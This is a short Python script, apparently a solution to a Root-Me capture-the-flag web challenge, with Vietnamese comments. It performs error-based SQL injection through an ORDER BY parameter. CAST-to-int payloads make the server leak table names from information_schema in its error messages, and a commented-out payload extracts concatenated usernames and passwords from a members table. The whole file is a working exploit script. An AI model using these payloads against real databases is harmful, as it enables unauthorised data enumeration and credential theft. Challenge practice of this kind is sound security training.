import requests

url = 'http://challenge01.root-me.org/web-serveur/ch34/'

# sau order by thì liệt kê bằng dấu ',' thôi, tránh xóa ASC lỗi ko chạy đc function sau
# server chạy hàm cast đầu tiên sẽ exec query -> result varchar -> cast as int -> lỗi -> trả về lỗi cùng result
# offset(n): bỏ qua phần tử (vd: có 10 pt -> offset(4): 5->10); limit chỉ lấy 1 vì current table chỉ chứa 1 column

for i in range(100):
#	payload = 'ASC,cast((SELECT column_name from information_schema.columns limit 1 offset %d) as int)' %(i)
	payload = "ASC,cast((SELECT table_name FROM information_schema.tables limit 1 offset %s) as int)" %(i)
	params = {'action':'contents','order':payload}
	r = requests.get(url, params=params)
	print(r.text[442:]) # đếm số chữ rồi cắt thôi!



# payload = "ASC,cast((SELECT concat(us3rn4m3_c0l,p455w0rd_c0l) FROM m3mbr35t4bl3 limit 1) as int)"
# params = {'action':'contents','order':payload}
# r = requests.get(url, params=params)
# print(r.text)